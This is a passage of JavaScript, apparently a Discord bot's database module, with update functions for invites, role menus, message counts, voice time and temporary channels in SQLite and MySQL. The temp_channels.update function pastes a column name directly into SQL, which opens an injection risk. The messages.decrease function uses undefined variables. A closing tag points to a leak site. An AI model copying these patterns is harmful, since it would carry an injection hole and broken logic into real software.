                        module.exports.mysql.database.query("DELETE FROM locked_channels WHERE guild=? AND channel=?", [guild, channel], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        invites: {
            updateData(user, data) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !data) return reject('[DATABASE (update.invites.updateData)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        let inviteData = module.exports.sqlite.database.prepare("SELECT * FROM invites WHERE user=? AND guild=?").get(user.id, user.guild.id);
                        if (inviteData) {
                            module.exports.sqlite.database.prepare("UPDATE invites SET regular=?, bonus=?, leaves=?, fake=? WHERE user=? AND guild=?").run(data.regular, data.bonus, data.leaves, data.fake, user.id, user.guild.id);
                        } else {
                            module.exports.sqlite.database.prepare("INSERT INTO invites(guild, user, regular, bonus, leaves, fake) VALUES(?, ?, ?, ?, ?, ?)").run(user.guild.id, user.id, data.regular, data.bonus, data.leaves, data.fake);
                        }
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("SELECT * FROM invites WHERE user=? AND guild=?", [user.id, user.guild.id], (err, inviteData) => {
                            if (inviteData.length) {
                                module.exports.mysql.database.query("UPDATE invites SET regular=?, bonus=?, leaves=?, fake=? WHERE user=? AND guild=?", [data.regular, data.bonus, data.leaves, data.fake, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    else resolve();
                                });
                            } else {
                                module.exports.mysql.database.query("INSERT INTO invites(guild, user, regular, bonus, leaves, fake) VALUES(?, ?, ?, ?, ?, ?)", [user.guild.id, user.id, data.regular, data.bonus, data.leaves, data.fake], (err) => {
                                    if (err) reject(err);
                                    else resolve();
                                });
                            }
                        });
                    }
                });
            },
            addJoin(user, inviter) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !inviter) return reject('[DATABASE (update.invites.addJoin)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO joins(guild, user, inviter, time) VALUES(?, ?, ?, ?)").run(user.guild.id, user.id, inviter.id, Date.now());
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO joins(guild, user, inviter, time) VALUES(?, ?, ?, ?)", [user.guild.id, user.id, inviter.id, Date.now()], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
        },
        role_menus: {
            add(message, name) {
                return new Promise(async (resolve, reject) => {
                    if (!message) return reject('[DATABASE (update.role_menus.add)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO role_menus(guild, channel, message, name) VALUES(?, ?, ?, ?)").run(message.guild.id, message.channel.id, message.id, name.toLowerCase());
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO role_menus(guild, channel, message, name) VALUES(?, ?, ?, ?)", [message.guild.id, message.channel.id, message.id, name.toLowerCase()], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            remove(message) {
                return new Promise(async (resolve, reject) => {
                    if (!message) return reject('[DATABASE (update.role_menus.remove)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("DELETE FROM role_menus WHERE message=?").run(message);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("DELETE FROM role_menus WHERE message=?", [message], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        },
        messages: {
            increase(user, amount = 1) {
                return new Promise(async (resolve, reject) => {
                    if (!user || typeof amount != "number" || !user.id || !user.guild) return reject('[DATABASE (update.messages.increase)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        const data = module.exports.sqlite.database.prepare('SELECT * FROM message_counts WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!data) {
                            module.exports.sqlite.database.prepare('INSERT INTO message_counts(guild, user, count) VALUES(?, ?, ?)').run(user.guild.id, user.id, amount);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE message_counts SET count=? WHERE user=? AND guild=?').run(data.count + amount, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM message_counts WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO message_counts(guild, user, count) VALUES(?, ?, ?)', [user.guild.id, user.id, amount], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE message_counts SET count=? WHERE user=? AND guild=?', [rows[0].count + amount, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            },
            decrease(amount = 1) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !amount || !user.id || !user.guild) return reject('[DATABASE (update.messages.increase)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        const data = module.exports.sqlite.database.prepare('SELECT * FROM message_counts WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (data) {
                            module.exports.sqlite.database.prepare('UPDATE message_counts SET count=? WHERE user=? AND guild=?').run(data.count - amount > 0 ? data.count - count : 0, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM message_counts WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (rows[0]) {
                                module.exports.mysql.database.query('UPDATE message_counts SET count=? WHERE user=? AND guild=?', [rows[0].count - amount > 0 ? rows[0].count - count : 0, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        voice_time: {
            updateJoinTime(user, time) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !user.guild) return reject('[DATABASE (update.voice_time.updateJoinTime)] Invalid inputs');

                    time = time ? time : null;

                    if (module.exports.type === 'sqlite') {
                        const data = module.exports.sqlite.database.prepare('SELECT * FROM voice_time WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!data) {
                            module.exports.sqlite.database.prepare('INSERT INTO voice_time(guild, user, total_time, join_date) VALUES(?, ?, ?, ?)').run(user.guild.id, user.id, 0, time);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE voice_time SET join_date=? WHERE user=? AND guild=?').run(time, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM voice_time WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO voice_time(guild, user, total_time, join_date) VALUES(?, ?, ?, ?)', [user.guild.id, user.id, 0, time], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE voice_time SET join_date=? WHERE user=? AND guild=?', [time, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            },
            addVoiceTime(user, amount) {
                return new Promise(async (resolve, reject) => {
                    if (!user || !user.guild || isNaN(amount)) return reject('[DATABASE (update.voice_time.addVoiceTime)] Invalid inputs');

                    if (module.exports.type === 'sqlite') {
                        const data = module.exports.sqlite.database.prepare('SELECT * FROM voice_time WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!data) {
                            module.exports.sqlite.database.prepare('INSERT INTO voice_time(guild, user, total_time, join_date) VALUES(?, ?, ?, ?)').run(user.guild.id, user.id, amount, null);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE voice_time SET total_time=? WHERE user=? AND guild=?').run(data.total_time + amount, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM voice_time WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO voice_time(guild, user, total_time, join_date) VALUES(?, ?, ?, ?)', [user.guild.id, user.id, amount, null], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE voice_time SET total_time=? WHERE user=? AND guild=?', [rows[0].total_time + amount, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        temp_channels: {
            create(channel, owner, settings) {
                return new Promise(async (resolve, reject) => {
                    if (!channel || !owner || !settings) return reject('[DATABASE (update.temp_channels.create)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("INSERT INTO temp_channels(guild, channel_id, channel_name, owner, public, allowed_users, max_members, bitrate) VALUES(?, ?, ?, ?, ?, ?, ?, ?)").run(channel.guild.id, channel.id, channel.name, owner.id, settings.public ? 1 : 0, JSON.stringify(settings.allowed_users), settings.max_members, settings.bitrate);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("INSERT INTO temp_channels(guild, channel_id, channel_name, owner, public, allowed_users, max_members, bitrate) VALUES(?, ?, ?, ?, ?, ?, ?, ?)", [channel.guild.id, channel.id, channel.name, owner.id, settings.public, JSON.stringify(settings.allowed_users), settings.max_members, settings.bitrate], async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            delete(guild_id, channel_id) {
                return new Promise(async (resolve, reject) => {
                    if (!guild_id || !channel_id) return reject('[DATABASE (update.temp_channels.delete)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare("DELETE FROM temp_channels WHERE guild=? AND channel_id=?").run(guild_id, channel_id);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query("DELETE FROM temp_channels WHERE guild=? AND channel_id=?", [guild_id, channel_id], (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            },
            update(channel_id, setting, value) {
                return new Promise(async (resolve, reject) => {
                    if (!channel_id || !setting) return reject('[DATABASE (update.temp_channels.update)] Invalid inputs');

                    if (module.exports.type == "sqlite") {
                        module.exports.sqlite.database.prepare(`UPDATE temp_channels SET ${setting}=? WHERE channel_id=?`).run(value, channel_id);
                        resolve();
                    } else if (module.exports.type == "mysql") {
                        module.exports.mysql.database.query(`UPDATE temp_channels SET ${setting}=? WHERE channel_id=?`, [value, channel_id], async (err) => {
                            if (err) reject(err);
                            else resolve();
                        });
                    }
                });
            }
        }
    }
};
// BlackKarma | DirectLeaks